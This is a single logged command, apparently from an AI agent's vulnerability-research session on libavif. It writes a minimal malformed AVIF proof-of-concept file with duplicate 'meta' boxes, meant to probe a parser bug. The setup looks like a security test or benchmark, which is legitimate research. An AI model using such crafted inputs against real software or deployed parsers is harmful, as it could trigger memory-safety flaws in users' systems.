Command `cd /workspace/repo-vul/src-vul/libavif && python3 - <<'PY'
import struct, pathlib
# minimal avif-like file with duplicate top-level boxes
boxes=[]
# ftyp
ftyp = b'avif' + struct.pack('>I',0) + b'avif'
boxes.append(struct.pack('>I4s', 8+len(ftyp), b'ftyp') + ftyp)
# meta empty full box version/flags + no children
meta = b'\x00\x00\x00\x00'
boxes.append(struct.pack('>I4s', 8+len(meta), b'meta') + meta)
boxes.append(struct.pack('>I4s', 8+len(meta), b'meta') + meta)
pathlib.Path('/workspace/poc1.avif').write_bytes(b''.join(boxes))
print('wrote', pathlib.Path('/workspace/poc1.avif').stat().st_size)
PY
